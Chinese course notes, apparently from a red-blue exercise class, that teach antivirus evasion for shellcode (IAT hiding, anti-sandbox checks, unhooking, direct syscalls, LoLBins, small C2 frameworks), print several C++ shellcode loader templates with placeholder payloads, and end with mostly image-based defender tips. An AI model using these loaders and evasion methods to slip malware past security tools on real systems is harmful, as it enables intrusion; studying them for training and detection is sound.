<p>在PE结构中，存在一个导入表，导入表中声明了这个PE文件会载入哪些模块，同时每个模块的结构中又会指向模块中的一些函数名称。这样的组织关系是为了告诉操作系统这些函数的地址在哪里，方便修正调用地址。如果一个文件的文件大小在300KB以内，并且导入函数又有Virtual Alloc、CreateThread，且VirtualAlloc的最后一个参数是0x40，那么此文件是高危文件。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220148183.png" alt="image-20220716220148183"></p>
<hr>
<p><strong>Shellcode免杀—API调用隐藏</strong></p>
<p>前置知识：<br>•PE结构知识<br>•Windows API<br>•C/C++编程语言基础<br>原理：<br>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地<br>址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p>
<p>隐藏IAT<br>我们要实现的就是：相当于隐藏敏感的API，通过 GetModuleHandle + GetProcAddress 的方式隐藏敏感API<br>一般进内存的主要流程：<br>•VirtualAlloc -&gt; VirtualProtect -&gt; CreateThread -&gt; WaitForSingleObject<br>这几个函数是比较明显的，并且都在kernel32.dll中导出，尝试自己定义他们的函数指针，然后利用GetProcAddress获取函数地址，调用自己的函数名称。</p>
<hr>
<p><strong>Shellcode免杀—动态(行为)查杀</strong></p>
<p>动态查杀指的是 程序在运行的过程中执行了某些敏感操作，导致杀软查杀。谈到动态查杀不得不提一个东西叫沙盒。<br>沙盒：也叫启发式查杀，通过模拟计算机的环境执行目标文件再观察特征行为。沙盒模拟的常见特征：其实主要就是找一台真实的计算机和沙盒的区别到底在哪，找到那些真实的计算机具有而模拟的计算机无法具有的特征，进行绕过即可</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220433905.png" alt="image-20220716220433905"></p>
<p>杀软监控动态查杀的点：<br>•系统服务（指的是这些）<br>•注册表（键值） 修改注册表的行为一般都是敏感行为（高危添加用户、删除用户）<br>•组策略<br>•防火墙<br>•敏感程序（cmd powershell wmi psexec bitsadmin rundll 等）<br>•各种 win32api<br>这里强调一下，监控进程调用的api不止是api名字，还包括api的 调用顺序、调用源、参数等等 。</p>
<p>网络相关<br>•流量特征: cobalt strike 的通信协议，是由 RSA 传输 AES 的密钥，AES的密钥加密后续通信，这也是c2的常规通信手法，但未经修改的profile 和证书，很容易被检测到。<br>•内容特征：data字段是否存在命令相关的关键词加密特征（payload是否通讯加密，明文传输就会被查杀）<br>•结构特征: 是否存在已知远控的通讯结构（ cs 中 beacon 有 sleep）<br>•IP : 是否被情报系统标记为恶意</p>
<p>对行为来讲，很多个API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控。</p>
<p>对于api的bypass：<br>•白名单<br>•用实现同样功能的api替换<br>•重写对应的api<br>•调用0环的api绕过3环杀软（直接系统调用)<br>等等，肯定不止这些， 说起来很容易，但具体实现需要很深的底层功底，起码对Windows操作系统的底层实现，win32api等很熟悉，这就需要内功。</p>
<hr>
<p><strong>Shellcode免杀—Shellcode加载方式</strong></p>
<p>执行内存空间shellcode的api或者方法：<br>•创建线程，比如CreateThread，如果是进程注入那就是CreateRemoteThread<br>•指针执行<br>•syscall<br>•apc注入<br>或是使用Fiber（纤程）加载，还有很多，都是一些技巧了，核心其实就是这么些API，再去做规避。</p>
<p>直接执⾏</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">	<span class="keyword">void</span> *exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="keyword">sizeof</span> buf, MEM_COMMIT, </span><br><span class="line">	PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, buf, <span class="keyword">sizeof</span> buf);</span><br><span class="line">	((<span class="built_in"><span class="keyword">void</span></span>(*)())exec)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建堆</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">	HANDLE myHeap = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">void</span>* exec = <span class="built_in">HeapAlloc</span>(myHeap, HEAP_ZERO_MEMORY, <span class="built_in"><span class="keyword">sizeof</span></span>(shellcode));</span><br><span class="line">	<span class="built_in">memcpy</span>(exec,shellcode,<span class="built_in"><span class="keyword">sizeof</span></span>(shellcode));</span><br><span class="line">	((<span class="built_in"><span class="keyword">void</span></span>(*)())exec)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>data段</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	((<span class="built_in"><span class="keyword">void</span></span>(*)())(<span class="keyword">void</span>*)shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建线程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode⻓度</span></span><br><span class="line">	DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">	HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">	<span class="comment">/* length: 800 bytes */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(buf), MEM_COMMIT,</span><br><span class="line">	PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">CopyMemory</span>(shellcode,buf,<span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">	hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">	(LPTHREAD_START_ROUTINE)shellcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId );</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread,INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回调函数，⽐如：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	LPVOID address = ::<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(shellcode), MEM_RESERVE |</span><br><span class="line">	MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(address, &amp;shellcode[<span class="number">0</span>], <span class="built_in"><span class="keyword">sizeof</span></span>(shellcode));</span><br><span class="line">	HDC dc = <span class="built_in">GetDC</span>(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">EnumFontsW</span>(dc, <span class="literal">NULL</span>, (FONTENUMPROCW)address, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>Shellcode免杀—内存加载免杀</strong></p>
<p>用实现同样功能的api替换<br>试想我们开辟一块内存,然后直接将shellcode写入到对应的内存中并且该内存是可读可写可执行的状态,那么这种方式太容易被AV所查杀,因此当我们如果是利用Windows自身提供的API来将加密或者封装好的shellcode写入到内存执行的话,将会<br>大大增加查杀的难度。<br>•通过UUID方式实现内存加载<br>•利用MAC实现内存加载<br>•利用Ipv4方式实现内存加载<br>•利用Ipv6方式实现内存加载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/crisprss/Shellcode_Memory_Loader">https://github.com/crisprss/Shellcode_Memory_Loader</a><br>•基于Golang实现的Shellcode内存加载器,共实现3中内存加载shellcode方式,<br>•UUID加载,MAC加载和IPv4加载<br>•结合binject/universal实现Golang的内存加载DLL方式,<br>•使用AllocADsMem实现内存申请,以加强免杀效果<br>•简单的反沙箱机制,</p>
<hr>
<p><strong>Shellcode免杀—反射DLL注入</strong></p>
<p>常见方法：<br>•创建新线程<br>•插入Apc队列<br>•手动实现LoadLibrary<br>•修改注册表<br>•挂钩窗口消息<br>•设置线程上下背景文，修改寄存器</p>
<hr>
<p><strong>后渗透常见行为免杀—PE文件加载器</strong></p>
<p>PE加载器<br>PE加载器，就是将一个PE文件映射到自己的内存，然后启动其main函数运行程序。一个PELoader的实现，需要有几个注意点：内存对齐，修复IAT表，修复重定位表，将内存属性改为可执行。<br>•内存对齐，根据exe文件在加载到内存中对齐粒度进行对齐<br>•修复IAT表，根据PE结构的导入表，加载所需的dll，并获取导入函数的地址并写入导入表中<br>•修复重定位表，直接申请当前exe的ImageBase地址，如果加载到内存当中的基址与Option Header的Image Base一样，就相当于在理想基址中展开，不需要修复重定位表。但是这种方法一般用于x64的程序，因为x86程序的Image Base较低，被占用导致无法正常执行的几率很高。<br>•程序加密，使用了RC4加密算法，将要加载的PE文件加密并存放在资源段中，这种方法其实免杀效果并不好，接下来可以考虑其他将Loader和payload分离的其他方法。</p>
<p>执行流程<br>加载PE文件：判断是否为PE文件，然后将要加载的文件读取到内存中，并且对齐。进行重定位：如果当前加载到内存当中的基址与Option Header的Image Base一样，即在理想基址中展开了，或重定位表data[5]的长度为0，则不需要重定位。重定位表的sizeOfBlock是加上块头部8字节的大小。重定位元素也很简单，以WORD为单位，但要注意高4位为0x3才有效，修复重定位表时要检查该位是否有效。<br>构建导入表：通过偏移+内存基址，获取导入表第一个dll的数据，按照导入的dll逐个遍历，直到当前导入表的OriginalFirstThunk为0，即遍历完毕。</p>
<hr>
<p><strong>Shellcode免杀—系统直接调用</strong></p>
<p>Windows操作系统中实际只使用了两个特权级别：<br>一个是Ring3层，平时我们所见到的应用程序运行在这一层，所以叫它用户层，也叫User-Mode。所以下次听到别人讲（Ring3、用户层、User-Mode）时，其实是在讲同一个概念。一个是Ring0层，像操作系统内核（Kernel）这样重要的系统组件，以及设备驱动都是运行在Ring0，内核层，也叫Kernel-Mode。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716221353625.png" alt="image-20220716221353625"></p>
<p>通过这些保护层来隔离普通的用户程序，不能直接访问内存区域，以及运行在内核模式下的系统资源。当一个用户层程序需要执行一个特权系统操作，或者访问内核资源时。处理器首先需要切换到Ring0模式下才能执行后面的操作。切换Ring0的代码，也就是直接系统调用所在的地方。我们通过监控Notepad.exe进程保存一个.txt文件，来演示一个应用层程序如<br>何切换到内核模式执行的：</p>
<p>地狱之门是一个动态调用syscall的工具，在绕过杀软、EDR等防护软件上有不错的效果，其原理可以查看：<br><a target="_blank" rel="noopener" href="https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf">https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf</a></p>
<hr>
<p><strong>后渗透常见行为免杀—白+黑</strong></p>
<p>•LoLBin是操作系统提供的二进制文件，通常用于合法目的，但也有可能被恶意行为者滥用。有一些默认存在的系统二进制文件可能会存在一些“副作用”，从而导致攻击者利用这些系统文件来隐藏他们的恶意活动。<br>•LoLBins并不是一个新鲜的概念，也不仅仅针对Windows环境。从早期的DOS操作系统和Unix系统开始，几乎所有流行的操作系统中都包含着攻击者可以利用的可执行文件。</p>
<p>白加黑 算是一个很好的方法，指的是利用Windows系统的一些白文件去执行相应的敏感操作，就不会触发杀软警告，想一想，有哪个普通的程序去执行添加用户的操作呢？说到底，白加黑解决的是 Windows里面 信任与权限的问题，Windows 都相信你，它一个杀软有什么办法，权限指的是你的权限是否比杀软的权限高，如果你在0环，杀软在3环，它也没有权限来管你，更不用说kill。</p>
<hr>
<p><strong>Shellcode免杀—anti sandbox(云沙箱对抗)</strong></p>
<p>那么问题来了，如何对抗云沙箱的检测呢？我们知道，很多杀软都有自己的后端云沙箱，这些沙箱能够模拟出软件执行所需的运行环境，通过进程hook技术来对软件执行过程中的行为进行分析，判断其是否有敏感的操作行为，或者更高级的检测手法是，将获取到的程序的API调用序列以及其他的一些行为特征输入到智能分析引擎中（基于机器学习org）进行检测。所以，如果我们的木马没有做好反调试，很容易就被沙箱检测出来。最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是explore。如果一个程序的父进程不是explore，那么我们就可以认为他是由沙箱启动的。那么我们就直接exit退出，这样，杀软就无法继续对我们进行行为分析了。</p>
<p>当今大多数真实机具有4GB以上的RAM,我们可以检测RAM是否大于4GB来判断是否是真实的运行机器,同样大多数真实机拥有4核心cpu，许多在线检测的虚拟机沙箱是2核，我们可以通过核心数来判断是否为真实机器或检测用的虚拟沙箱，当然反沙箱还有更多高端操作以及其他判断源，例如可以从系统开机时间、临时文件夹的文件数目</p>
<hr>
<p><strong>后渗透常见行为免杀—api unhooking</strong></p>
<p>杀软会hook关键函数,可以修改函数的头部来脱钩<br>另外 可以使用系统直接调用,绕过杀软对一些脱钩过程中使用的函数的hook<br>•<a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/">https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716221823970.png" alt="image-20220716221823970"></p>
<p>Hook<br>•<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions">https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/EDRs/">https://github.com/Mr-Un1k0d3r/EDRs/</a><br>•<a target="_blank" rel="noopener" href="https://gist.github.com/sbasu7241/4c2640fb6dd5bfdcfac07b83f1648ee0">https://gist.github.com/sbasu7241/4c2640fb6dd5bfdcfac07b83f1648ee0</a><br>Unhook<br>•<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-e">https://www.ired.team/offensive-security/defense-e</a>…<br>•AQUARMOURY/Shellycoat at master · slaeryan/AQUARMO…<br>•GitHub - mgeeky/unhook-bof: Remove API hooks from …</p>
<hr>
<p><strong>Shellcode免杀—隐藏窗口</strong></p>
<p>wmain 创建窗口项目<br>•命令参数</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">•<span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/subsystem:windows /entry:mainCRTStartup&quot;</span> )</span></span><br><span class="line">•powershell</span><br><span class="line">•Start-<span class="built_in">Process</span> <span class="string">&quot;C:`z\Windows\System32\cmd.exe&quot;</span> -Window Hidden</span><br><span class="line">•C#</span><br><span class="line">•var handle = <span class="built_in">GetConsoleWindow</span>();</span><br><span class="line">		<span class="built_in">ShowWindow</span>(handle, SW_HIDE);</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>Shellcode免杀—小众语言</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/V1V1/OffensiveAutoIt">https://github.com/V1V1/OffensiveAutoIt</a><br>•<a target="_blank" rel="noopener" href="https://github.com/aeverj/NimShellCodeLoader">https://github.com/aeverj/NimShellCodeLoader</a></p>
<hr>
<p><strong>Shellcode免杀—小众c2框架</strong></p>
<p>目前而言，cs 无论是马或者源文件都被分析烂了，且 cs 的行为太明显了，必须要大改特改才能满足现在的红蓝对抗，但是想大改谈何容易，所以最快的方法是寻找一款新的 c2 框架，说白了，远控自己都能写一个出来，执行一些简单操作还是可以的。<br>•github 地址<br>•<a target="_blank" rel="noopener" href="https://github.com/postrequest/link">https://github.com/postrequest/link</a></p>
<h1 id="安全运维"><a href="#安全运维" class="headerlink" title="安全运维"></a>安全运维</h1><h2 id="护-网-概-述"><a href="#护-网-概-述" class="headerlink" title="护 网 概 述"></a>护 网 概 述</h2><p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211458133.png" alt="image-20220720211458133"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211603924.png" alt="image-20220720211603924"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211640434.png" alt="image-20220720211640434"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211718311.png" alt="image-20220720211718311"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211738215.png" alt="image-20220720211738215"></p>
<p><strong>防守方技巧</strong></p>
<p>技巧<br>➢非所属资产必须上诉; ( 合作企业资产带有单位名称/logo ,不再负责运营管理的资产等)<br>➢被判别为敏感数据但非数据库泄露的扣分项选择性上诉;<br>➢被判别为内网资产的扣分项,要求提供证明是我方资产;<br>要点<br>➢态度严谨<br>➢无确凿证据,拒不承认</p>
<p><strong>防守方主动得分技巧</strong></p>
<p>技巧<br>➢关注文件沙箱的告警日志,分析业务系统/邮箱流量获取的恶意样本;<br>➢关注高危漏洞告警, 如注入、命令执行、反序列化,系统提取等漏洞;<br>要点<br>➢严格按照标准,提供充足证明</p>
<p><strong>实用技巧</strong></p>
<p>IP封禁是简单有效的防护方式;<br>内网资产监测与防护极为重要;<br>遇到国外地址进行攻击一律封禁,虽无法得分但具有真实防护效果;<br>沙箱设备能覆盖木马攻击和邮件攻击,建议设置专人专职进行样本分析;<br>提交报告需包含关键内容:源IP ,事件类型,流量分析(全流量) ,有样本需附上样本及分析报告,切忌只截设备告警图;<br>建立快速沟通渠道, 避免耽误上报时间;</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212244679.png" alt="image-20220720212244679"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212300633.png" alt="image-20220720212300633"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212416280.png" alt="image-20220720212416280"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212429524.png" alt="image-20220720212429524"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212443481.png" alt="image-20220720212443481"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212500317.png" alt="image-20220720212500317"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212513850.png" alt="image-20220720212513850"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212550171.png" alt="image-20220720212550171"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212607604.png" alt="image-20220720212607604"></p>
<h2 id="前-期-自-查-工-作"><a href="#前-期-自-查-工-作" class="headerlink" title="前 期 自 查 工 作"></a>前 期 自 查 工 作</h2><p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212624861.png" alt="image-20220720212624861"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212637310.png" alt="image-20220720212637310"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212652093.png" alt="image-20220720212652093"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212704967.png" alt="image-20220720212704967"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212723115.png" alt="image-20220720212723115"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212740402.png" alt="image-20220720212740402"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212759766.png" alt="image-20220720212759766"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212812736.png" alt="image-20220720212812736"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212829023.png" alt="image-20220720212829023"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212842376.png" alt="image-20220720212842376"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212856316.png" alt="image-20220720212856316"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212910137.png" alt="image-20220720212910137"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212922873.png" alt="image-20220720212922873"></p>
<h2 id="资-产-梳-理"><a href="#资-产-梳-理" class="headerlink" title="资 产 梳 理"></a>资 产 梳 理</h2><p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212936159.png" alt="image-20220720212936159"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213045148.png" alt="image-20220720213045148"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213103871.png" alt="image-20220720213103871"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213117733.png" alt="image-20220720213117733"></p>
<p><strong>基本收集方法</strong><br>1.基础资产表收集<br>2.扫描手段补充信息<br>3.监控手段补充信息<br>4.其它信息补充</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213150966.png" alt="image-20220720213150966"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213203225.png" alt="image-20220720213203225"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213219885.png" alt="image-20220720213219885"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213233146.png" alt="image-20220720213233146"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213247198.png" alt="image-20220720213247198"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213259188.png" alt="image-20220720213259188"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213310069.png" alt="image-20220720213310069"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213324469.png" alt="image-20220720213324469"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213338629.png" alt="image-20220720213338629"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213354017.png" alt="image-20220720213354017"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213405856.png" alt="image-20220720213405856"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213417386.png" alt="image-20220720213417386"></p>
<h2 id="漏-洞-扫-描"><a href="#漏-洞-扫-描" class="headerlink" title="漏 洞 扫 描"></a>漏 洞 扫 描</h2><p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213432717.png" alt="image-20220720213432717"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213445651.png" alt="image-20220720213445651"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213456544.png" alt="image-20220720213456544"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213508974.png" alt="image-20220720213508974"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213520210.png" alt="image-20220720213520210"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213532602.png" alt="image-20220720213532602"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213550344.png" alt="image-20220720213550344"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213618711.png" alt="image-20220720213618711"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213630219.png" alt="image-20220720213630219"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213646085.png" alt="image-20220720213646085"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213656781.png" alt="image-20220720213656781"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213708434.png" alt="image-20220720213708434"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213718442.png" alt="image-20220720213718442"></p>
<p><strong>漏扫结果评估</strong><br>1关键信息提权<br>2漏洞信息检索<br>3常见加固方案<br>4报告整理输出</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213758077.png" alt="image-20220720213758077"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213810096.png" alt="image-20220720213810096"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213847667.png" alt="image-20220720213847667"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213857324.png" alt="image-20220720213857324"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213906685.png" alt="image-20220720213906685"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213917457.png" alt="image-20220720213917457"></p>
<p><strong>漏洞扫描误报分析</strong><br>1.常见误报分析<br>2.常见误报场景<br>3.误报案例分析</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213939512.png" alt="image-20220720213939512"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213954218.png" alt="image-20220720213954218"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214207666.png" alt="image-20220720214207666"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214147195.png" alt="image-20220720214147195"></p>
